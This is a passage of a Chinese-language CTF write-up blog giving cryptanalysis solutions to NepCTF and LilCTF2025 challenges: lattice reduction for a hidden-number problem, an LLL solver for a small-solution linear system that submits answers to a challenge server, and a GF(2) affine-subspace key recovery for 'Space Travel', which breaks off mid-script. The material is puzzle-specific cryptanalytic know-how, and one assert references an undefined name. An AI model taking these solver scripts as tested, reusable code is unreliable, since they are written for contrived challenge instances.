class="line"></span><br><span class="line"><span class="comment">#flag = long_to_bytes(alpha)</span></span><br></pre></td></tr></table></figure>

<p>首先我们要恢复极小多项式的常数项，参考<em>A Gentle Tutorial for Lattice-Based Cryptanalysis</em>的3.6可以知道我们可以造如下格(截个原文的图，实际应该把8换成45，这与给出的精度有关)</p>
<p><img src="https://ooo.0x0.ooo/2025/08/04/OfkWUq.png" alt="OfkWUq.png"></p>
<p>直接规约就能得到目标向量啦。后来看<a href="https://blog.swizzer.cc/posts/%E5%88%87%E9%A2%98-202507/#nepctf-2025---lattice-bros">Swizzer师傅的博客</a>，才了解到sage有内置的函数直接求极小多项式<a href="https://doc.sagemath.org/html/en/reference/rings_standard/sage/arith/misc.html#sage.arith.misc.algdep">Miscellaneous arithmetic functions - Standard Commutative Rings</a></p>
<p>恢复了之后这就是一个HNP问题了。</p>
<p><img src="https://ooo.0x0.ooo/2025/08/05/OfkFNG.png" alt="OfkFNG.png"></p>
<p>因为这里式子里是减法，所以r那一行的负号也就没必要加了。不过因为配平的原因，尝试发现多乘一个4能规约出结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = RealField(<span class="number">200</span>)(<span class="number">54236.606188881754809671280151541781895183337725393</span>)</span><br><span class="line">N = <span class="number">10</span>^<span class="number">45</span></span><br><span class="line">L = matrix(ZZ, [[floor(N), <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [floor(N * a), <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">                [floor(N * a**<span class="number">2</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                [floor(N * a**<span class="number">3</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line">a0 = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a0)</span><br><span class="line">samples = [(<span class="number">541847931463604073209188621415697353813245102261880389530448</span>, <span class="number">293760933113243563398917466885108625646262447370201484418246</span>), (<span class="number">235213326900086489464935804156966465366154623411555613791270</span>, <span class="number">660823982268225103178763707015491421784294988488272636270997</span>), (<span class="number">826464884761457937459245903152143755707241416981488127320435</span>, <span class="number">428521663319038461250005113612781686761766888058391496085911</span>), (<span class="number">589542000504317435156560078533519448295689695687499354390208</span>, <span class="number">155284353896000150766154807679279597476176668344402166959399</span>), (<span class="number">968823371588600973965757332601758200815345862153455338808286</span>, <span class="number">870008943690791009196027169525956126827736285614393106689402</span>), (<span class="number">621636099728440147413990266662022925118216803638588918660041</span>, <span class="number">265635912066749696542909843111997941904342442664219734956888</span>), (<span class="number">426696569424050102229606043215592727790577655338668728275370</span>, <span class="number">279313121876980354011480010042682666651614765507190502627689</span>), (<span class="number">89450479064580125731654556963306718472532905610952012502649</span>, <span class="number">465933125964565419295325650759566635253450915499965633327941</span>), (<span class="number">480355476500393865742379469913983270769356894135485925662119</span>, <span class="number">894041172171871806404285309781862268351135623868845025443422</span>), (<span class="number">842436524669577199024236805258573090764419350786291073287889</span>, <span class="number">345478552143958037534551648319293899442551000874041707820740</span>), (<span class="number">650054674429185550652935714084022116516082323269321462104664</span>, <span class="number">441999979283903658157822753439653947343822546158589507765994</span>), (<span class="number">46289431385578693366971976442426853079852982529357847290686</span>, <span class="number">625618376463384339878849844467050454204685252824782609369180</span>), (<span class="number">71444185449163133531919043374545893927347050624346741281881</span>, <span class="number">955925578289311966288639224625142299309823207245807788495453</span>), (<span class="number">192579726169321656812883068526498248523814846320328766176253</span>, <span class="number">626481822474054336470183912297952839011392733501646931370367</span>), (<span class="number">736527635648804640774976580747540045854351230084566721853611</span>, <span class="number">276626211757586963928788091386096607703513204646314683038338</span>), (<span class="number">177922521867185878959621840269164617147915792720210315529733</span>, <span class="number">541058782621716573816245900423919799500476442285991532228641</span>), (<span class="number">40610451174818168154306630612571678739921107216052349044576</span>, <span class="number">727642592899858828601137105077611015328512898368636299587376</span>), (<span class="number">385012983728389322601149562441674995471397288632464238356283</span>, <span class="number">353921151307105661267278594470212933060655245893209524497156</span>), (<span class="number">750447975601038834764379841158092390933760641866111445401426</span>, <span class="number">391626416964965737035878375834907580903143512300198923948189</span>), (<span class="number">115058604943298010958881205548782439407592353731185670266593</span>, <span class="number">491630592857258949793489206081490523001249620510479961058022</span>), (<span class="number">327389234395954477946639629629085910688793716425320663599360</span>, <span class="number">24975272330009592102362429346350824580378490147041708568130</span>), (<span class="number">115595274689129534885608766476695918464309130165432995990883</span>, <span class="number">757961876891952019297626599379744405302595090402128271144165</span>), (<span class="number">950804723308776351161744501221236453742418549093165078282534</span>, <span class="number">20307246759635231945223392614290397512873344480184942904518</span>), (<span class="number">724537610412063699714461780160573528810830178440136810747811</span>, <span class="number">149681928388378582933943374524511804362928290938917573644613</span>), (<span class="number">340891278018589324130004945217960336392205386747747011263373</span>, <span class="number">683307718413135477104477081812052183267507312278283317237187</span>), (<span class="number">104379682905784169840335131193505192063050242530811180817410</span>, <span class="number">715010230598797717533306270232399781090458356371977748416491</span>), (<span class="number">644160326926600986730919713173510327120201404569141824224075</span>, <span class="number">127877985489410167008195578625004740882394608402141169695352</span>), (<span class="number">549253388716005399852261816416312267100135940382820676807345</span>, <span class="number">210560134643237517255193955173709174155305784935427470113433</span>), (<span class="number">968265711632086435506163736279856957220961064226797549228006</span>, <span class="number">273174723915971720522674140326199419265943707917542063022561</span>), (<span class="number">704367622558261900937184683100177434487519780290678439135652</span>, <span class="number">959106497548134540301589019840013331842784496835379005298630</span>)]</span><br><span class="line"></span><br><span class="line">n = <span class="number">30</span></span><br><span class="line">d = <span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line">p = d - a0</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">rs = []</span><br><span class="line">cs = []</span><br><span class="line"><span class="keyword">for</span> r_val, t_val <span class="keyword">in</span> samples:</span><br><span class="line">    rs.append(r_val)</span><br><span class="line">    cs.append(t_val)</span><br><span class="line">t = <span class="built_in">len</span>(rs)</span><br><span class="line">P = identity_matrix(t) * p</span><br><span class="line">RC = matrix([[-r <span class="keyword">for</span> r <span class="keyword">in</span> rs], cs])</span><br><span class="line">KP = matrix([[B*<span class="number">4</span> / p, <span class="number">0</span>], [<span class="number">0</span>, B]])</span><br><span class="line">M = block_matrix([[P, <span class="number">0</span>], [RC, KP]], subdivide=<span class="literal">False</span>)</span><br><span class="line">shortest_vector = M.LLL()</span><br><span class="line"><span class="keyword">assert</span> shortest_vector == re</span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">abs</span>(shortest_vector[<span class="number">1</span>][-<span class="number">2</span>] * p)) // (B * <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>LilCTF2025</title>
    <url>/2025/08/18/LilCTF2025/</url>
    <content><![CDATA[<p>owo</p>
<p>打这个比赛也学到了蛮多东西，这里仅记录Linear,Space Travel，baaaaaag三道题</p>
<span id="more"></span>

<h1 id="Linear"><a href="#Linear" class="headerlink" title="Linear"></a>Linear</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&quot;LILCTF_FLAG&quot;</span>, <span class="string">&quot;LILCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">nrows = <span class="number">16</span></span><br><span class="line">ncols = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">A = [[random.randint(<span class="number">1</span>, <span class="number">1919810</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ncols)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line">x = [random.randint(<span class="number">1</span>, <span class="number">114514</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ncols)]</span><br><span class="line"></span><br><span class="line">b = [<span class="built_in">sum</span>(A[i][j] * x[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">xx = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&quot;Enter your solution: &quot;</span>).strip().split()))</span><br><span class="line"><span class="keyword">if</span> xx != x:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh, your linear algebra needs to be practiced.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Bravo! Here is your flag:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>审一下代码，本题的大概意思就是求解Ax &#x3D; b这个线性方程组。已知的是一个(16$<em>$32)的矩阵A和(16$</em>$1)的向量b，我们需要求解这个（32$*$1)的向量x。</p>
<p>而且这个特定的解 <code>x</code> 是由较小的整数（1 到 114514）组成的(恶臭的x)</p>
<p>显然这道题要用格去做。首先，将方程变形为 <code>Ax - b = 0</code>，显然我们就得到了这个格的等式，我们首先构造一个矩阵，M &#x3D; [A | -b]即把-b作为新的一列拼接到A的最右边得到这个增广矩阵。然后我们求这个矩阵的右核。即找到一个向量v满足 <code>M * v = 0</code>这个v向量的格式为v &#x3D; [x_1, x_2, …, x_32, 1]^T，这是一个33$*$1的列向量。这个核空间的一组基就是我们格的初始基。这个基由 17 个 33 维的向量组成。我们对这个基进行规约然后找到最后一个元素为1的那一个向量。这就是我们要求的x啦。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> json, re</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> Matrix, vector, ZZ</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">data_str</span>):</span><br><span class="line">    matrix_str = re.search(<span class="string">r&#x27;(\[\[.*\]\])&#x27;</span>, data_str, re.DOTALL).group(<span class="number">1</span>)</span><br><span class="line">    vector_str = re.findall(<span class="string">r&#x27;(\[[\d, -]+\])&#x27;</span>, data_str)[-<span class="number">1</span>]</span><br><span class="line">    A_list, b_list = json.loads(matrix_str), json.loads(vector_str)</span><br><span class="line">    </span><br><span class="line">    A = Matrix(ZZ, A_list)</span><br><span class="line">    b = vector(ZZ, b_list)</span><br><span class="line">    M = A.augment(-b)</span><br><span class="line">    kernel_basis = M.right_kernel().basis()</span><br><span class="line">    lll_basis = Matrix(ZZ, kernel_basis).LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> lll_basis:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(v[-<span class="number">1</span>]) == <span class="number">1</span>:</span><br><span class="line">            solution_v = v <span class="keyword">if</span> v[-<span class="number">1</span>] == <span class="number">1</span> <span class="keyword">else</span> -v</span><br><span class="line">            <span class="keyword">return</span> solution_v[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    conn = remote(<span class="string">&quot;challenge.xinshi.fun&quot;</span>, <span class="number">36735</span>)</span><br><span class="line">    </span><br><span class="line">    data = conn.recvuntil(<span class="string">b&quot;Enter your solution: &quot;</span>).decode()</span><br><span class="line">    </span><br><span class="line">    solution = solve(data)</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solution:</span><br><span class="line">        solution_str = <span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, solution))</span><br><span class="line">        conn.sendline(solution_str.encode())</span><br><span class="line">        <span class="built_in">print</span>(conn.recvall(timeout=<span class="number">5</span>).decode())</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>



<h1 id="Space-Travel"><a href="#Space-Travel" class="headerlink" title="Space Travel"></a>Space Travel</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> params <span class="keyword">import</span> vecs</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([vecs[<span class="built_in">int</span>.from_bytes(urandom(<span class="number">2</span>)) &amp; <span class="number">0xfff</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎁 :&quot;</span>, [[nonce := <span class="built_in">int</span>(urandom(<span class="number">50</span>*<span class="number">2</span>).<span class="built_in">hex</span>(), <span class="number">16</span>), (<span class="built_in">bin</span>(nonce &amp; key).count(<span class="string">&quot;1&quot;</span>)) % <span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🚩 :&quot;</span>, AES.new(key=md5(<span class="built_in">str</span>(key).encode()).digest(), nonce=<span class="string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()))</span><br></pre></td></tr></table></figure>

<p>鸡块的题，经典代码越短题目越难</p>
<p>还是来看看题目大意，首先是做 50 次int.from_bytes(urandom(2)) &amp; 0xfff 产生一个 0到4095 的随机索引。然后取对应的vecs[idx]，顺序拼接50个得到一个800bit的。最后转成十进制数得到key。</p>
<p>然后是🎁和🚩的生成，首先我们来看🎁，生成了600组样本，对于每一组样本，先是urandom(50$*$2)得到100字节，也就是800bit，然后bin(nonce &amp; key).count(“1”)) % 2这一段是计算(nonce &amp; key)中1的个数mod 2.</p>
<p>然后用key的十进制转MD5做密钥加密明文得到🚩</p>
<p>虽然直觉是直接造格打，但是600 800的格好像不太行，遂放弃。不过后来发现了一个奇妙东西-仿射子空间，因为我们知道vecs的是4096个16bits的向量。刚好是2的12次方个，这里我们首先大概了解一下什么是仿射子空间</p>
<p>“仿射子空间”（Affine Subspace）&#x3D; “线性子空间的一个平移”。 形式： A &#x3D; b ⊕ L （或写 A &#x3D; b + L）</p>
<ul>
<li>L 是一个线性子空间</li>
<li>b 是某个固定向量（称为平移向量、偏移、锚点）</li>
<li>A 中所有元素都可以表示成 b + ℓ，其中 ℓ ∈ L</li>
<li>如果 b &#x3D; 0，那么 A &#x3D; L，本质上就是线性子空间本身</li>
</ul>
<p>仿射子空间不要求包含零向量（除非恰好 b ∈ L，使 A &#x3D; L）。</p>
<p>那么对于本题来说我们可以认为vecs的结构就是一个仿射子空间 b ⊕ L。</p>
<p>我们任取 vecs[0] &#x3D; b。构造集合 { vecs[i] ⊕ b } 得到纯线性空间 L 的元素。那么这个L的维度应该就是12.</p>
<p>得到 L 的一组基行向量后形成矩阵 G：</p>
<p>把 12 个基行向量转置为列向量 ⇒ G 是 16×12 矩阵。这里的16是因为<code>vecs</code> 里，每个元素是16位二进制字符串。也就是说，每个向量是 16维的 0&#x2F;1 向量。</p>
<p>然后遍历600条样本，把800bit的nonce分为50个16bit的块 a_{t,j}与key对应</p>
<p>累加 &lt;a_{t,j}, b&gt; 得 K_t；计算 G^T a_{t,j} 填充矩阵行；得到 s’_t &#x3D; s_t ⊕ K_t。</p>
<p>得到 M(600×600)、S’(600)。到这里，所有 600 条样本都被转化成了一个标准的 GF(2) 线性方程组：M⋅W&#x3D;S′</p>
<p>其中：</p>
<ul>
<li><p>M 是 600×600 的 GF(2) 矩阵，完全由 nonce、仿射空间结构 G 和偏移 b 决定；</p>
</li>
<li><p>W 是 600 维的变量向量（50个w_j拼起来，每个12位）；</p>
</li>
<li><p>S’ 是右侧的常数向量。</p>
<p>这样我们就可以将问题降维为 600 未知 + 600 方程 的线性系统，然后我们计算M的秩，当然理想状态下我们希望他是满秩的，其对应的零空间的维度就为0，这样就能得到一个唯一解。</p>
<ul>
<li><p>M 是 600×600 的 GF(2) 系数矩阵</p>
</li>
<li><p>nullity&#x3D;600−rank(M)</p>
</li>
<li><p>如果 nullity&#x3D;0：唯一解</p>
</li>
<li><p>如果 nullity&#x3D;1：所有解是“某个特解 + 1 个方向的线性组合”，即 2 个可能解</p>
</li>
<li><p>如果 nullity&#x3D;d：共有 2$^{d} $个可能解</p>
<p>这道题我们算出来发现秩是599，也就是说有两个可能解，我们都打印出来看一下就能判断了。为了便于理解让ai生成了一个很详细的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ast  <span class="comment"># 用于安全地将字符串解析为 Python 对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 数据加载模块 ---</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 正在从文件加载数据...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 从 params.py 导入 vecs</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> params <span class="keyword">import</span> vecs</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  - `vecs` 从 params.py 加载成功。&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  - 错误: 无法找到或导入 &#x27;params.py&#x27;。请确保该文件在同一目录下。&quot;</span>)</span><br><span class="line">    vecs = []  <span class="comment"># 定义一个空列表以避免后续代码崩溃</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 从 output.txt 解析 oracle_data 和 ciphertext</span></span><br><span class="line">oracle_data = []</span><br><span class="line">ciphertext = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">&quot;🎁 :&quot;</span>):</span><br><span class="line">                <span class="comment"># 提取 &quot;🎁 : &quot; 后面的列表字符串</span></span><br><span class="line">                list_str = line[<span class="built_in">len</span>(<span class="string">&quot;🎁 :&quot;</span>):].strip()</span><br><span class="line">                oracle_data = ast.literal_eval(list_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  - `oracle_data` 从 output.txt 解析成功。&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> line.startswith(<span class="string">&quot;🚩 :&quot;</span>):</span><br><span class="line">                <span class="comment"># 提取 &quot;🚩 : &quot; 后面的字节串字符串</span></span><br><span class="line">                bytes_str = line[<span class="built_in">len</span>(<span class="string">&quot;🚩 :&quot;</span>):].strip()</span><br><span class="line">                ciphertext = ast.literal_eval(bytes_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  - `ciphertext` 从 output.txt 解析成功。&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  - 错误: &#x27;output.txt&#x27; 文件未找到。&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 错误: 解析 &#x27;output.txt&#x27; 时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 核心求解逻辑 (与原版基本一致) ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 SageMath 域</span></span><br><span class="line">F = GF(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_vec</span>(<span class="params">bitstr</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将二进制字符串转换为 GF(2) 向量&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> vector(F, [<span class="built_in">int</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> bitstr])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printable_score</span>(<span class="params">bs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算字节串中可打印 ASCII 字符的比例，用于评估解密结果&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">for</span> b <span class="keyword">in</span> bs) / <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">len</span>(bs))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rebuild_key_from_W</span>(<span class="params">W, b, G, BLOCKS=<span class="number">50</span>, AFFINE_DIM=<span class="number">12</span>, VEC_LEN=<span class="number">16</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据 600-bit 的系数向量 W 重建 800-bit 的密钥&quot;&quot;&quot;</span></span><br><span class="line">    key_bits_parts = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(BLOCKS):</span><br><span class="line">        w_j = W[j*AFFINE_DIM:(j+<span class="number">1</span>)*AFFINE_DIM]</span><br><span class="line">        v_j = b + G * vector(F, w_j)   <span class="comment"># 在 GF(2) 中，v_j = b ⊕ (G * w_j)</span></span><br><span class="line">        key_bits_parts.append(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">list</span>(v_j))))</span><br><span class="line">    key_bitstring = <span class="string">&quot;&quot;</span>.join(key_bits_parts)</span><br><span class="line">    <span class="keyword">return</span> key_bitstring</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_key_int</span>(<span class="params">key_int, ciphertext</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用给定的密钥整数解密密文&quot;&quot;&quot;</span></span><br><span class="line">    aes_key = md5(<span class="built_in">str</span>(key_int).encode()).digest()</span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CTR, nonce=<span class="string">b&quot;Tiffany&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主求解函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 检查数据是否加载成功</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> vecs <span class="keyword">or</span> <span class="keyword">not</span> oracle_data <span class="keyword">or</span> <span class="keyword">not</span> ciphertext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[!] 错误: 数据加载不完整，无法继续求解。请检查文件是否存在或内容是否正确。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    VEC_LEN = <span class="number">16</span></span><br><span class="line">    BLOCKS = <span class="number">50</span></span><br><span class="line">    AFFINE_DIM = <span class="number">12</span></span><br><span class="line">    KEY_LEN = VEC_LEN * BLOCKS      <span class="comment"># 800</span></span><br><span class="line">    UNKNOWN_BITS = BLOCKS * AFFINE_DIM  <span class="comment"># 600</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[1] 分析 `vecs` 结构，构造仿射子空间 b ⊕ L...&quot;</span>)</span><br><span class="line">    vec_vectors = [bits_to_vec(v) <span class="keyword">for</span> v <span class="keyword">in</span> vecs]</span><br><span class="line">    b = vec_vectors[<span class="number">0</span>]</span><br><span class="line">    L_vectors = [v + b <span class="keyword">for</span> v <span class="keyword">in</span> vec_vectors]   <span class="comment"># v - b 在 GF(2) 中就是 v + b</span></span><br><span class="line">    L_space = matrix(F, L_vectors).row_space()</span><br><span class="line">    dimL = L_space.dimension()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 线性部分 L 的维度: <span class="subst">&#123;dimL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> dimL != AFFINE_DIM:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  - !!! 警告: 维度不等于预期的 12，结果可能不正确。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 将基行向量转换为列向量，构成矩阵 G</span></span><br><span class="line">    basis_rows = L_space.basis()</span><br><span class="line">    G = matrix(F, <span class="built_in">list</span>(<span class="built_in">zip</span>(*basis_rows)))</span><br><span class="line">    G_T = G.transpose()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  - 仿射空间的偏移 b 和基矩阵 G 构建完成。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[2] 构建 600x600 的线性方程组 M * W = S&#x27;...&quot;</span>)</span><br><span class="line">    eqn_count = <span class="built_in">min</span>(<span class="number">600</span>, <span class="built_in">len</span>(oracle_data))</span><br><span class="line">    M_rows = []</span><br><span class="line">    S_prime = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(eqn_count):</span><br><span class="line">        nonce_int, s_t = oracle_data[t]</span><br><span class="line">        bits = <span class="built_in">bin</span>(nonce_int)[<span class="number">2</span>:].zfill(KEY_LEN)</span><br><span class="line">        K_t = F(<span class="number">0</span>)</span><br><span class="line">        row = vector(F, UNKNOWN_BITS)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(BLOCKS):</span><br><span class="line">            seg = bits[j*VEC_LEN:(j+<span class="number">1</span>)*VEC_LEN]</span><br><span class="line">            a = bits_to_vec(seg)</span><br><span class="line">            K_t += a.dot_product(b)</span><br><span class="line">            coeff_block = G_T * a</span><br><span class="line">            row[j*AFFINE_DIM:(j+<span class="number">1</span>)*AFFINE_DIM] = coeff_block</span><br><span class="line">        S_prime.append(F(s_t) + K_t)</span><br><span class="line">        M_rows.append(row)</span><br><span class="line">    M = matrix(F, M_rows)</span><br><span class="line">    S_vec = vector(F, S_prime)</span><br><span class="line">    rk = M.rank()</span><br><span class="line">    nullity = UNKNOWN_BITS - rk</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 矩阵 M: <span class="subst">&#123;M.nrows()&#125;</span>x<span class="subst">&#123;M.ncols()&#125;</span>, 秩(rank)=<span class="subst">&#123;rk&#125;</span>, 零度(nullity)=<span class="subst">&#123;nullity&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[3] 求解特解 W0 和零空间...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        W0 = M.solve_right(S_vec)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  - solve_right 失败，尝试 solution_space: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        sol_space = M.solution_space(S_vec)</span><br><span class="line">        W0 = sol_space.representative()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  - 已获得一个特解 W0。&quot;</span>)</span><br><span class="line">    kernel = M.right_kernel()</span><br><span class="line">    basis = kernel.basis()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  - 零空间维度为 <span class="subst">&#123;<span class="built_in">len</span>(basis)&#125;</span>。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nullity &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  - 零空间维度过大 (2^&#123;&#125;), 无法暴力枚举。&quot;</span>.<span class="built_in">format</span>(nullity))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[4] 枚举 <span class="subst">&#123;<span class="number">2</span>**nullity&#125;</span> 个候选解...&quot;</span>)</span><br><span class="line">    candidates = []</span><br><span class="line">    <span class="keyword">if</span> nullity == <span class="number">0</span>:</span><br><span class="line">        candidates.append(W0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> mask <span class="keyword">in</span> <span 